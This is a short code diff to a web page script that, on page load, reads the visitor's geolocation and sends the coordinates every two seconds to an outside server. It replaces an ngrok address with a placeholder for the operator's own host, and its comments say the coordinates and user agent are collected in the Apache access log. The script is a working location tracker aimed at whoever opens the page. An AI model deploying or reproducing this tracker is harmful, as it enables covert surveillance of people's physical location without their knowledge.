@@ -3,7 +3,7 @@
 function httpGet(theUrl)
 {
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.open( "GET", theUrl, false ); // false for sync reqs
     xmlHttp.send( null );
     return xmlHttp.responseText;
 }
@@ -11,14 +11,12 @@ function httpGet(theUrl)
 function autoUpdate() {
   navigator.geolocation.getCurrentPosition(function(position) {
     coords = position.coords.latitude + "," + position.coords.longitude;
-    url = "https://efb2f1c3.ngrok.io" + coords;
+    url = <YOUR SERVERIP/FQDN GOES HERE>/logme/ + coords;   //Example :https:Nemoserver.com/logme/  and appends useragent and coords to /var/log/apache2/access.log
     httpGet(url);
-    console.log('should be working');
-    setTimeout(autoUpdate, 1000);
+    setTimeout(autoUpdate, 2000); // updates /var/log/apache2/access.log with the coords after every 2 seconds
 })
 };
 $(document).ready(function(){
    autoUpdate();
 });
 </script>
-
